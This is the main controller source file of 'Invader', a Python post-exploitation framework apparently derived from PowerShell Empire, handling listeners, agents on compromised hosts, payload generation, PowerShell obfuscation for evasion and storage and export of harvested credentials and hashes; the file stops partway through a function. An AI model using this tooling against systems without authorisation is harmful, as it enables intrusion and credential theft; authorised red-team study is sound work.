"""

The main controller class for Invader.

This is what's launched from ./invader (/usr/local/bin/invader).
Contains the Main, Listener, Agents, Agent, and Module menu loops.

"""

VERSION='1.8'

from pydispatch import dispatcher

import sys
import cmd
import sqlite3
import os
import hashlib
import time
import fnmatch
import shlex
import marshal
import pkgutil
import importlib
import base64
import threading
import json

# Invader imports
import helpers
import messages
import agents
import listeners
import modules
import payloads
import credentials
import plugins
from events import log_event
from zlib_wrapper import compress
from zlib_wrapper import decompress


# custom exceptions used for nested menu navigation
class NavMain(Exception):
    """
    Custom exception class used to navigate to the 'main' menu.
    """
    pass


class NavAgents(Exception):
    """
    Custom exception class used to navigate to the 'agents' menu.
    """
    pass


class NavListeners(Exception):
    """
    Custom exception class used to navigate to the 'listeners' menu.
    """
    pass


class MainMenu(cmd.Cmd):
    """
    The main class used by Invader to drive the 'main' menu
    displayed when Invader starts.
    """
    def __init__(self, args=None):

        cmd.Cmd.__init__(self)

        # set up the event handling system
        dispatcher.connect(self.handle_event, sender=dispatcher.Any)

        # globalOptions[optionName] = (value, required, description)
        self.globalOptions = {}

        # currently active plugins:
        # {'pluginName': classObject}
        self.loadedPlugins = {}

        # empty database object
        self.conn = self.database_connect()
        time.sleep(1)

        self.lock = threading.Lock()
        # pull out some common configuration information
        (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList, self.obfuscate, self.obfuscateCommand) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist,obfuscate,obfuscate_command')

        # change the default prompt for the user
        self.prompt = '(Invader)> '
        self.do_help.__func__.__doc__ = '''Displays the help menu.'''
        self.doc_header = 'Commands'

        # Main, Agents, or
        self.menu_state = 'Main'

        # parse/handle any passed command line arguments
        self.args = args
        # instantiate the agents, listeners, and payloads objects
        self.agents = agents.Agents(self, args=args)
        self.credentials = credentials.Credentials(self, args=args)
        self.payloads = payloads.payloads(self, args=args)
        self.modules = modules.Modules(self, args=args)
        self.listeners = listeners.Listeners(self, args=args)
        self.resourceQueue = []
        #A hashtable of autruns based on agent language
        self.autoRuns = {}

        self.handle_args()

        message = "[*] Invader starting up..."
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="Invader")

    def get_db_connection(self):
        """
        Returns the 
        """
        self.lock.acquire()
        self.conn.row_factory = None
        self.lock.release()
        return self.conn


    def handle_event(self, signal, sender):
        """
        Whenver an event is received from the dispatcher, log it to the DB,
        decide whether it should be printed, and if so, print it.
        If self.args.debug, also log all events to a file.
        """
        # load up the signal so we can inspect it
        try:
            signal_data = json.loads(signal)
        except ValueError:
            print(helpers.color("[!] Error: bad signal recieved {} from sender {}".format(signal, sender)))
            return

        # this should probably be set in the event itself but we can check
        # here (and for most the time difference won't matter so it's fine)
        if 'timestamp' not in signal_data:
            signal_data['timestamp'] = helpers.get_datetime()

        # if this is related to a task, set task_id; this is its own column in
        # the DB (else the column will be set to None/null)
        task_id = None
        if 'task_id' in signal_data:
            task_id = signal_data['task_id']

        if 'event_type' in signal_data:
            event_type = signal_data['event_type']
        else:
            event_type = 'dispatched_event'

        event_data = json.dumps({'signal': signal_data, 'sender': sender})

        # print any signal that indicates we should
        if('print' in signal_data and signal_data['print']):
            print(helpers.color(signal_data['message']))

        # get a db cursor, log this event to the DB, then close the cursor
        cur = self.conn.cursor()
        # TODO instead of "dispatched_event" put something useful in the "event_type" column
        log_event(cur, sender, event_type, json.dumps(signal_data), signal_data['timestamp'], task_id=task_id)
        cur.close()

        # if --debug X is passed, log out all dispatcher signals
        if self.args.debug:
            with open('Invader.debug', 'a') as debug_file:
                debug_file.write("%s %s : %s\n" % (helpers.get_datetime(), sender, signal))

            if self.args.debug == '2':
                # if --debug 2, also print the output to the screen
                print " %s : %s" % (sender, signal)


    def check_root(self):
        """
        Check if Invader has been run as root, and alert user.
        """
        try:

            if os.geteuid() != 0:
                if self.isroot:
                    messages.title(VERSION)
                    print "[!] Warning: Running Invader as non-root, after running as root will likely fail to access prior agents!"
                    while True:
                        a = raw_input(helpers.color("[?] Are you sure you want to continue (y) or (n): "))
                        if a.startswith("y"):
                            return
                        if a.startswith("n"):
                            self.shutdown()
                            sys.exit()
                else:
                    pass
            if os.geteuid() == 0:
                if self.isroot:
                    pass
                if not self.isroot:
                    cur = self.conn.cursor()
                    cur.execute("UPDATE config SET rootuser = 1")
                    cur.close()
        except Exception as e:
            print e


    def handle_args(self):
        """
        Handle any passed arguments.
        """
	if self.args.resource:
	    resourceFile = self.args.resource[0]
	    self.do_resource(resourceFile)

        if self.args.listener or self.args.payload:
            # if we're displaying listeners/payloads or generating a payload
            if self.args.listener:
                if self.args.listener == 'list':
                    messages.display_listeners(self.listeners.activeListeners)
                    messages.display_listeners(self.listeners.get_inactive_listeners(), "Inactive")

                else:
                    activeListeners = self.listeners.activeListeners
                    targetListener = [l for l in activeListeners if self.args.listener in l[1]]

                    if targetListener:
                        targetListener = targetListener[0]
                        # messages.display_listener_database(targetListener)
                        # TODO: reimplement this logic
                    else:
                        print helpers.color("\n[!] No active listeners with name '%s'\n" % (self.args.listener))

            else:
                if self.args.payload == 'list':
                    print "\npayloads:\n"
                    print "  Name             Description"
                    print "  ----             -----------"
                    for payloadName, payload in self.payloads.payloads.iteritems():
                        print "  %s%s" % ('{0: <17}'.format(payloadName), payload.info['Description'])
                    print "\n"
                else:
                    payloadName = self.args.payload
                    try:
                        targetpayload = self.payloads.payloads[payloadName]
                        menu = payloadMenu(self, payloadName)

                        if self.args.payload_options:
                            for option in self.args.payload_options:
                                if '=' not in option:
                                    print helpers.color("\n[!] Invalid option: '%s'" % (option))
                                    print helpers.color("[!] Please use Option=Value format\n")
                                    if self.conn:
                                        self.conn.close()
                                    sys.exit()

                                # split the passed payload options by = and set the appropriate option
                                optionName, optionValue = option.split('=')
                                menu.do_set("%s %s" % (optionName, optionValue))

                            # generate the payload
                            menu.do_generate('')

                        else:
                            messages.display_payload(targetpayload)

                    except Exception as e:
                        print e
                        print helpers.color("\n[!] No current payload with name '%s'\n" % (payloadName))

            # shutdown the database connection object
            if self.conn:
                self.conn.close()

            sys.exit()


    def shutdown(self):
        """
        Perform any shutdown actions.
        """
        print (helpers.color("[!] Shutting down..."))

        message = "[*] Invader shutting down..."
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="Invader")

        # enumerate all active servers/listeners and shut them down
        self.listeners.shutdown_listener('all')

        # shutdown the database connection object
        if self.conn:
            self.conn.close()


    def database_connect(self):
        """
        Connect to the default database at ./data/invader.db.
        """
        try:
            # set the database connectiont to autocommit w/ isolation level
            self.conn = sqlite3.connect('./data/invader.db', check_same_thread=False)
            self.conn.text_factory = str
            self.conn.isolation_level = None
            return self.conn

        except Exception:
            print helpers.color("[!] Could not connect to the database")
            print helpers.color("[!] Please run database_setup.py")
            sys.exit()

    def cmdloop(self):
        """
        The main cmdloop logic that handles navigation to other menus.
        """
        while True:
            try:
                if self.menu_state == 'Agents':
                    self.do_agents('')
                elif self.menu_state == 'Listeners':
                    self.do_listeners('')
                else:
                    # display the main title
                    messages.title(VERSION)

                    # get active listeners, agents, and loaded modules
                    num_agents = self.agents.get_agents_db()
                    if num_agents:
                        num_agents = len(num_agents)
                    else:
                        num_agents = 0

                    num_modules = self.modules.modules
                    if num_modules:
                        num_modules = len(num_modules)
                    else:
                        num_modules = 0

                    num_listeners = self.listeners.activeListeners
                    if num_listeners:
                        num_listeners = len(num_listeners)
                    else:
                        num_listeners = 0
		    info = 'Invader'
		    infoget = '['
		    infof = 'Framework'

	            print ("        --="+helpers.color(str(infoget), "green")+" "+helpers.color(str(info), "green")+" Post Exploitation "+helpers.color(str(infof), "green")+"")
		    print ("+---**---=="+helpers.color(str(infoget), "green")+" Available Modules: "+helpers.color(str(num_modules), "green")+"")
	            print ("+---**---=="+helpers.color(str(infoget), "green")+" Active Listeners: "+helpers.color(str(num_listeners), "green")+"")
		    print ("        --="+helpers.color(str(infoget), "green")+" Active Agents: "+helpers.color(str(num_agents), "green")+"\n")

		    if len(self.resourceQueue) > 0:
	    		self.cmdqueue.append(self.resourceQueue.pop(0))

                    cmd.Cmd.cmdloop(self)


            # handle those pesky ctrl+c's
            except KeyboardInterrupt as e:
                self.menu_state = "Main"
                try:
                    choice = raw_input(helpers.color("[?] Exit from the Invader? [y/N] ", "red"))
                    if choice.lower() != "" and choice.lower()[0] == "y":
                        self.shutdown()
                        return True
                    else:
                        continue
                except KeyboardInterrupt as e:
                    continue

            # exception used to signal jumping to "Main" menu
            except NavMain as e:
                self.menu_state = "Main"

            # exception used to signal jumping to "Agents" menu
            except NavAgents as e:
                self.menu_state = "Agents"

            # exception used to signal jumping to "Listeners" menu
            except NavListeners as e:
                self.menu_state = "Listeners"

            except Exception as e:
                print helpers.color("[!] Exception: %s" % (e))
                time.sleep(5)


    def print_topics(self, header, commands, cmdlen, maxcol):
        """
        Print a nicely formatted help menu.
        Adapted from recon-ng
        """
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        """
        If any empty line is entered, do nothing.
        """
        pass

    ###################################################
    # CMD methods
    ###################################################

    def do_plugins(self, args):
        "List all available and active plugins."
        pluginPath = os.path.abspath("plugins")
        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
        # From walk_packages: "Note that this function must import all packages
        # (not all modules!) on the given path, in order to access the __path__
        # attribute to find submodules."
        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
        numFound = len(pluginNames)

        # say how many we found, handling the 1 case
        if numFound == 1:
            print(helpers.color("[*] {} plugin found".format(numFound)))
        else:
            print(helpers.color("[*] {} plugins found".format(numFound)))

        # if we found any, list them
        if numFound > 0:
            print("\tName\tActive")
            print("\t----\t------")
            activePlugins = self.loadedPlugins.keys()
            for name in pluginNames:
                active = ""
                if name in activePlugins:
                    active = "******"
                print("\t" + name + "\t" + active)

        print("")
        print(helpers.color("[*] Use \"plugin <plugin name>\" to load a plugin."))

    def do_plugin(self, pluginName):
        "Load a plugin file to extend Invader."
        pluginPath = os.path.abspath("plugins")
        print(helpers.color("[*] Searching for plugins at {}".format(pluginPath)))
        # From walk_packages: "Note that this function must import all packages
        # (not all modules!) on the given path, in order to access the __path__
        # attribute to find submodules."
        pluginNames = [name for _, name, _ in pkgutil.walk_packages([pluginPath])]
        if pluginName in pluginNames:
            print(helpers.color("[*] Plugin {} found.".format(pluginName)))

            message = "[*] Loading plugin {}".format(pluginName)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="Invader")

            # 'self' is the mainMenu object
            plugins.load_plugin(self, pluginName)
        else:
            raise Exception("[!] Error: the plugin specified does not exist in {}.".format(pluginPath))

    def postcmd(self, stop, line):
	if len(self.resourceQueue) > 0:
	    nextcmd = self.resourceQueue.pop(0)
	    self.cmdqueue.append(nextcmd)

    def default(self, line):
        "Default handler."
        pass

    def do_resource(self, arg):
	"Read and execute a list of Invader commands."
	self.resourceQueue.extend(self.buildQueue(arg))

    def buildQueue(self, resourceFile, autoRun=False):
	cmds = []
	if os.path.isfile(resourceFile):
	    with open(resourceFile, 'r') as f:
		lines = []
		lines.extend(f.read().splitlines())
	else:
	    raise Exception("[!] Error: The resource file specified \"%s\" does not exist" % resourceFile)
	for lineFull in lines:
	    line = lineFull.strip()
	    #ignore lines that start with the comment symbol (#)
	    if line.startswith("#"):
		continue
	    #read in another resource file
	    elif line.startswith("resource "):
		rf = line.split(' ')[1]
		cmds.extend(self.buildQueue(rf, autoRun))
	    #add noprompt option to execute without user confirmation
	    elif autoRun and line == "execute":
		cmds.append(line + " noprompt")
	    else:
		cmds.append(line)

	return cmds

    def do_exit(self, line):
        "Exit from the Invader."
        raise KeyboardInterrupt


    def do_agents(self, line):
        "Jump to the Agents menu."
        try:
            agents_menu = AgentsMenu(self)
            agents_menu.cmdloop()
        except Exception as e:
            raise e


    def do_listeners(self, line):
        "Interact with active listeners."
        try:
            listener_menu = ListenersMenu(self)
            listener_menu.cmdloop()
        except Exception as e:
            raise e


    def do_payload(self, line):
        "Select an Invader payload."

        try:
            parts = line.split(' ')

            if parts[0] not in self.payloads.payloads:
                print helpers.color("[!] Error: invalid payload module")

            elif len(parts) == 1:
                payload_menu = payloadMenu(self, parts[0])
                payload_menu.cmdloop()
            elif len(parts) == 2:
                listener = parts[1]
                if not self.listeners.is_listener_valid(listener):
                    print helpers.color("[!] Please enter a valid listener name or ID")
                else:
                    self.payloads.set_payload_option('Listener', listener)
                    payload_menu = payloadMenu(self, parts[0])
                    payload_menu.cmdloop()
            else:
                print helpers.color("[!] Error in MainMenu's do_userpayload()")
        except Exception as e:
            raise e


    def do_use(self, line):
        "Use an Invader module."
        # Strip asterisks added by MainMenu.complete_use()
        line = line.rstrip("*")
        if line not in self.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            try:
                module_menu = ModuleMenu(self, line)
                module_menu.cmdloop()
            except Exception as e:
                raise e


    def do_search(self, line):
        "Search an Invader module (names/descriptions)."
        self.modules.search_modules(line.strip())


    def do_creds(self, line):
        "Add/display database credentials."

        filterTerm = line.strip()

        if filterTerm == "":
            creds = self.credentials.get_credentials()

        elif shlex.split(filterTerm)[0].lower() == "add":

            # add format: "domain username password <notes> <credType> <sid>
            args = shlex.split(filterTerm)[1:]

            if len(args) == 3:
                domain, username, password = args
                if helpers.validate_ntlm(password):
                    # credtype, domain, username, password, host, sid="", notes=""):
                    self.credentials.add_credential("hash", domain, username, password, "")
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "")

            elif len(args) == 4:
                domain, username, password, notes = args
                if helpers.validate_ntlm(password):
                    self.credentials.add_credential("hash", domain, username, password, "", notes=notes)
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "", notes=notes)

            elif len(args) == 5:
                domain, username, password, notes, credType = args
                self.credentials.add_credential(credType, domain, username, password, "", notes=notes)

            elif len(args) == 6:
                domain, username, password, notes, credType, sid = args
                self.credentials.add_credential(credType, domain, username, password, "", sid=sid, notes=notes)

            else:
                print helpers.color("[!] Format is 'add domain username password <notes> <credType> <sid>")
                return

            creds = self.credentials.get_credentials()

        elif shlex.split(filterTerm)[0].lower() == "remove":

            try:
                args = shlex.split(filterTerm)[1:]
                if len(args) != 1:
                    print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")
                else:
                    if args[0].lower() == "all":
                        choice = raw_input(helpers.color("[?] Remove all credentials from the database? [y/N] ", "red"))
                        if choice.lower() != "" and choice.lower()[0] == "y":
                            self.credentials.remove_all_credentials()
                    else:
                        if "," in args[0]:
                            credIDs = args[0].split(",")
                            self.credentials.remove_credentials(credIDs)
                        elif "-" in args[0]:
                            parts = args[0].split("-")
                            credIDs = [x for x in xrange(int(parts[0]), int(parts[1]) + 1)]
                            self.credentials.remove_credentials(credIDs)
                        else:
                            self.credentials.remove_credentials(args)

            except Exception:
                print helpers.color("[!] Error in remove command parsing.")
                print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")

            return


        elif shlex.split(filterTerm)[0].lower() == "export":
            args = shlex.split(filterTerm)[1:]

            if len(args) != 1:
                print helpers.color("[!] Please supply an output filename/filepath.")
                return
            else:
                self.credentials.export_credentials(args[0])
                return

        elif shlex.split(filterTerm)[0].lower() == "plaintext":
            creds = self.credentials.get_credentials(credtype="plaintext")

        elif shlex.split(filterTerm)[0].lower() == "hash":
            creds = self.credentials.get_credentials(credtype="hash")

        elif shlex.split(filterTerm)[0].lower() == "krbtgt":
            creds = self.credentials.get_krbtgt()

        else:
            creds = self.credentials.get_credentials(filterTerm=filterTerm)

        messages.display_credentials(creds)


    def do_set(self, line):
        "Set a global option (e.g. IP whitelists)."

        parts = line.split(' ')
        if len(parts) == 1:
            print helpers.color("[!] Please enter 'IP,IP-IP,IP/CIDR' or a file path.")
        else:
            if parts[0].lower() == "ip_whitelist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        open_file = open(parts[1], 'r')
                        ipData = open_file.read()
                        open_file.close()
                        self.agents.ipWhiteList = helpers.generate_ip_list(ipData)
                    except Exception:
                        print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                else:
                    self.agents.ipWhiteList = helpers.generate_ip_list(",".join(parts[1:]))
            elif parts[0].lower() == "ip_blacklist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        open_file = open(parts[1], 'r')
                        ipData = open_file.read()
                        open_file.close()
                        self.agents.ipBlackList = helpers.generate_ip_list(ipData)
                    except Exception:
                        print helpers.color("[!] Error opening ip file %s" % (parts[1]))
                else:
                    self.agents.ipBlackList = helpers.generate_ip_list(",".join(parts[1:]))
            elif parts[0].lower() == "obfuscate":
                if parts[1].lower() == "true":
                    if not helpers.is_powershell_installed():
                        print helpers.color("[!] PowerShell is not installed and is required to use obfuscation, please install it first.")
                    else:
                        self.obfuscate = True

                        message = "[*] Obfuscating all future powershell commands run on all agents."
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="Invader")

                elif parts[1].lower() == "false":
                    self.obfuscate = False

                    message = "[*] Future powershell commands run on all agents will not be obfuscated."
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="Invader")

                else:
                    print helpers.color("[!] Valid options for obfuscate are 'true' or 'false'")
            elif parts[0].lower() == "obfuscate_command":
                self.obfuscateCommand = parts[1]
            else:
                print helpers.color("[!] Please choose 'ip_whitelist', 'ip_blacklist', 'obfuscate', or 'obfuscate_command'")


    def do_reset(self, line):
        "Reset a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            self.agents.ipWhiteList = None
        if line.strip().lower() == "ip_blacklist":
            self.agents.ipBlackList = None


    def do_show(self, line):
        "Show a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            print self.agents.ipWhiteList
        if line.strip().lower() == "ip_blacklist":
            print self.agents.ipBlackList
        if line.strip().lower() == "obfuscate":
            print self.obfuscate
        if line.strip().lower() == "obfuscate_command":
            print self.obfuscateCommand


    def do_load(self, line):
        "Load Invader modules from a folder."

        if line.strip() == '' or not os.path.isdir(line.strip()):
            print helpers.color("[!] Please specify a valid folder to load modules from.")
        else:
            self.modules.load_modules(rootPath=line.strip())


    def do_reload(self, line):
        "Reload one (or all) Invader modules."

        if line.strip().lower() == "all":
            # reload all modules
            print "\n" + helpers.color("[*] Reloading all modules.") + "\n"
            self.modules.load_modules()
        elif os.path.isdir(line.strip()):
            # if we're loading an external directory
            self.modules.load_modules(rootPath=line.strip())
        else:
            if line.strip() not in self.modules.modules:
                print helpers.color("[!] Error: invalid module")
            else:
                print "\n" + helpers.color("[*] Reloading module: " + line) + "\n"
                self.modules.reload_module(line)


    def do_list(self, line):
        "List active agents or listeners."

        parts = line.split(' ')

        if parts[0].lower() == 'agents':

            line = ' '.join(parts[1:])
            allAgents = self.agents.get_agents_db()

            if line.strip().lower() == 'stale':

                agentsToDisplay = []

                for agent in allAgents:

                    # max check in -> delay + delay*jitter
                    intervalMax = (agent['delay'] + agent['delay'] * agent['jitter']) + 30

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))
                    if agentTime < time.mktime(time.localtime()) - intervalMax:
                        # if the last checkin time exceeds the limit, remove it
                        agentsToDisplay.append(agent)

                messages.display_agents(agentsToDisplay)


            elif line.strip() != '':
                # if we're listing an agents active in the last X minutes
                try:
                    minutes = int(line.strip())

                    # grab just the agents active within the specified window (in minutes)
                    agentsToDisplay = []
                    for agent in allAgents:
                        agentTime = time.mktime(time.strptime(agent['lastseen_time'], "%Y-%m-%d %H:%M:%S"))

                        if agentTime > time.mktime(time.localtime()) - (int(minutes) * 60):
                            agentsToDisplay.append(agent)

                    messages.display_agents(agentsToDisplay)

                except Exception:
                    print helpers.color("[!] Please enter the minute window for agent checkin.")

            else:
                messages.display_agents(allAgents)


        elif parts[0].lower() == 'listeners':
            messages.display_listeners(self.listeners.activeListeners)
            messages.display_listeners(self.listeners.get_inactive_listeners(), "Inactive")


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        sessionID = self.agents.get_agent_id_db(name)
        if sessionID and sessionID != '' and sessionID in self.agents.agents:
            AgentMenu(self, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")

    def do_preobf(self, line):
        "Preobfuscate PowerShell module_source files."

        if not helpers.is_powershell_installed():
            print helpers.color("[!] PowerShell is not installed and is required to use obfuscation, please install it first.")
            return

        module = line.strip()
        obfuscate_all = False
        obfuscate_confirmation = False
        reobfuscate = False

        # Preobfuscate ALL module_source files
        if module == "" or module == "all":
            choice = raw_input(helpers.color("[?] Preobfuscate all PowerShell module_source files using obfuscation command: \"" + self.obfuscateCommand + "\"?\nThis may take a substantial amount of time. [y/N] ", "red"))
            if choice.lower() != "" and choice.lower()[0] == "y":
                obfuscate_all = True
                obfuscate_confirmation = True
                choice = raw_input(helpers.color("[?] Force reobfuscation of previously obfuscated modules? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":
                    reobfuscate = True

        # Preobfuscate a selected module_source file
        else:
            module_source_fullpath = self.installPath + 'data/module_source/' + module
            if not os.path.isfile(module_source_fullpath):
                print helpers.color("[!] The module_source file:" + module_source_fullpath + " does not exist.")
                return

            choice = raw_input(helpers.color("[?] Preobfuscate the module_source file: " + module + " using obfuscation command: \"" + self.obfuscateCommand + "\"? [y/N] ", "red"))
            if choice.lower() != "" and choice.lower()[0] == "y":
                obfuscate_confirmation = True
                choice = raw_input(helpers.color("[?] Force reobfuscation of previously obfuscated modules? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":
                    reobfuscate = True

        # Perform obfuscation
        if obfuscate_confirmation:
            if obfuscate_all:
                files = [file for file in helpers.get_module_source_files()]
            else:
                files = ['data/module_source/' + module]
            for file in files:
                file = self.installPath + file
                if reobfuscate or not helpers.is_obfuscated(file):
                    message = "[*] Obfuscating {}...".format(os.path.basename(file))
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'obfuscated_file': os.path.basename(file)
                    })
                    dispatcher.send(signal, sender="Invader")
                else:
                    print helpers.color("[*] " + os.path.basename(file) + " was already obfuscated. Not reobfuscating.")
                helpers.obfuscate_module(file, self.obfuscateCommand, reobfuscate)

    def do_report(self, line):
        "Produce report CSV and LOG files."
        conn = self.get_db_connection()
        try:
            self.lock.acquire()

            # Agents CSV
            cur = conn.cursor()
            cur.execute('select session_id, hostname, username, checkin_time from agents')

            rows = cur.fetchall()
            print helpers.color("[*] Writing data/sessions.csv")
            f = open('data/sessions.csv','w')
            f.write("SessionID, Hostname, User Name, First Check-in\n")
            for row in rows:
                f.write(row[0]+ ','+ row[1]+ ','+ row[2]+ ','+ row[3]+'\n')
            f.close()

            # Credentials CSV
            cur.execute("""
            SELECT
                domain
                ,username
                ,host
                ,credtype
                ,password
            FROM
                credentials
            ORDER BY
                domain
                ,credtype
                ,host
            """)

            rows = cur.fetchall()
            print helpers.color("[*] Writing data/credentials.csv")
            f = open('data/credentials.csv','w')
            f.write('Domain, Username, Host, Cred Type, Password\n')
            for row in rows:
                f.write(row[0]+ ','+ row[1]+ ','+ row[2]+ ','+ row[3]+ ','+ row[4]+'\n')
            f.close()

            # Invader Log
            cur.execute("""
            SELECT
                reporting.time_stamp
                ,reporting.event_type
                ,reporting.name as "AGENT_ID"
                ,a.hostname
                ,reporting.taskID
                ,t.data AS "Task"
                ,r.data AS "Results"
            FROM
                reporting
                JOIN agents a on reporting.name = a.session_id
                LEFT OUTER JOIN taskings t on (reporting.taskID = t.id) AND (reporting.name = t.agent)
                LEFT OUTER JOIN results r on (reporting.taskID = r.id) AND (reporting.name = r.agent)
            WHERE
                reporting.event_type == 'task' OR reporting.event_type == 'checkin'
            """)
            rows = cur.fetchall()
            print helpers.color("[*] Writing data/master.log")
            f = open('data/master.log', 'w')
            f.write('Invader Master Taskings & Results Log by timestamp\n')
            f.write('='*50 + '\n\n')
            for row in rows:
                f.write('\n' + row[0] + ' - ' + row[3] + ' (' + row[2] + ')> ' + unicode(row[5]) + '\n' + unicode(row[6]) + '\n')
            f.close()
            cur.close()
        finally:
            self.lock.release()

    def complete_use(self, text, line, begidx, endidx, language=None):
        "Tab-complete an Invader module path."

        module_names = self.modules.modules.keys()

        # suffix each module requiring elevated context with '*'
        for module_name in module_names:
            try:
                if self.modules.modules[module_name].info['NeedsAdmin']:
                    module_names[module_names.index(module_name)] = (module_name+"*")
            # handle modules without a NeedAdmins info key
            except KeyError:
                pass

        if language:
            module_names = [ (module_name[len(language)+1:]) for module_name in module_names if module_name.startswith(language)]

        mline = line.partition(' ')[2]

        offs = len(mline) - len(text)

        module_names = [s[offs:] for s in module_names if s.startswith(mline)]

        return module_names


    def complete_reload(self, text, line, begidx, endidx):
        "Tab-complete an Invader PowerShell module path."

        module_names = self.modules.modules.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in module_names if s.startswith(mline)]


    def complete_payload(self, text, line, begidx, endidx):
        "Tab-complete an Invader payload path."

        payloadNames = self.payloads.payloads.keys()

        if line.split(' ')[1].lower() in payloadNames:
            listenerNames = self.listeners.get_listener_names()
            endLine = ' '.join(line.split(' ')[1:])
            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        else:
            # otherwise tab-complate the payload names
            mline = line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in payloadNames if s.startswith(mline)]

    def complete_setlist(self, text, line, begidx, endidx):
        "Tab-complete a global list option."

        options = ["listeners", "agents"]

        if line.split(' ')[1].lower() in options:
            return helpers.complete_path(text, line, arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        options = ["ip_whitelist", "ip_blacklist", "obfuscate", "obfuscate_command"]

        if line.split(' ')[1].lower() in options:
            return helpers.complete_path(text, line, arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_load(self, text, line, begidx, endidx):
        "Tab-complete a module load path."
        return helpers.complete_path(text, line)


    def complete_reset(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        return self.complete_set(text, line, begidx, endidx)


    def complete_show(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        return self.complete_set(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."

        commands = ["add", "remove", "export", "hash", "plaintext", "krbtgt"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in commands if s.startswith(mline)]

    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command."

        names = self.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_list(self, text, line, begidx, endidx):
        "Tab-complete a list command."

        return self.complete_setlist(text, line, begidx, endidx)

    def complete_preobf(self, text, line, begidx, endidx):
        "Tab-complete an interact command."
        options = [ (option[len('data/module_source/'):]) for option in helpers.get_module_source_files() ]
        options.append('all')

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

class SubMenu(cmd.Cmd):

    def __init__(self, mainMenu):
        cmd.Cmd.__init__(self)
        self.mainMenu = mainMenu

    def cmdloop(self):
	if len(self.mainMenu.resourceQueue) > 0:
	    self.cmdqueue.append(self.mainMenu.resourceQueue.pop(0))
	cmd.Cmd.cmdloop(self)

    def emptyline(self):
        pass


    def postcmd(self, stop, line):
        if line == "back":
            return True
        if len(self.mainMenu.resourceQueue) > 0:
            nextcmd = self.mainMenu.resourceQueue.pop(0)
            if nextcmd == "lastautoruncmd":
                raise Exception("endautorun")
            self.cmdqueue.append(nextcmd)


    def do_back(self, line):
        "Go back to a previous menu."
        return True

    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()

    def do_agents(self, line):
        "Jump to the agents menu."
        raise NavAgents()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_resource(self, arg):
	"Read and execute a list of Invader commands."
	self.mainMenu.resourceQueue.extend(self.mainMenu.buildQueue(arg))

    def do_exit(self, line):
        "Exit from the Invader."
        raise KeyboardInterrupt

    def do_creds(self, line):
        "Display/return database credential."
        self.mainMenu.do_creds(line)

    # print a nicely formatted help menu
    #   stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")

    # def preloop(self):
    #     traceback.print_stack()

class AgentsMenu(SubMenu):
    """
    The main class used by Invader to drive the 'agents' menu.
    """
    def __init__(self, mainMenu):
        SubMenu.__init__(self, mainMenu)

        self.doc_header = 'Commands'

        # set the prompt text
        self.prompt = '(Invader: ' + helpers.color("agents", color="blue") + ')> '

        messages.display_agents(self.mainMenu.agents.get_agents_db())

    def do_back(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_autorun(self, line):
	"Read and execute a list of Invader commands."
	line = line.strip()
        if not line:
